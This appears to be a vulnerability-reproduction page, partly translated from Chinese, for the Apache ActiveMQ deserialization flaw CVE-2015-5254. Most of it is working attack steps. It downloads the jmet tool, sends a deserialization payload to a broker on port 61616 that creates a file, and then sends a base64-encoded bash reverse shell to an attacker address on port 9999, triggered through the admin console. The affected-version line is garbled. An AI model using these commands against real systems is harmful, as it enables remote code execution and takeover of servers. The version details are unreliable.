---
Title: Apache ActiveMQ Deserialization Vulnerability CVE-2015-5254
---

# Apache ActiveMQ Deserialization Vulnerability CVE-2015-5254

## Vulnerability Description

Apache ActiveMQ is a set of open source messaging middleware developed by the Apache Software Foundation in the United States. It supports Java message services, clusters, Spring Framework, etc. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache ActiveMQ version 5.13.0 before 5.x</span>

## Vulnerability reappears


</a-alert>

```shell
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
mkdir external
```

Send a payload that generates `/tmp/vuln` to the target

```plain
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/vuln" -Yp ROME xxx.xxx.xxx.xxx 61616
```

Visit `https://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event` to see an extra message queue

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220308145025293.png)

Click this information to trigger file creation

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220308145111363.png)

Successfully execute the command to create a file, or create a payload of `bounce shell`

```shell
bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1  (base64编码)
YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx

bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}

发送payload
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}" -Yp ROME xxx.xxx.xxx.xxx 61616
```

Clicking the message queue will trigger the command execution

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/image-20220308145310216.png)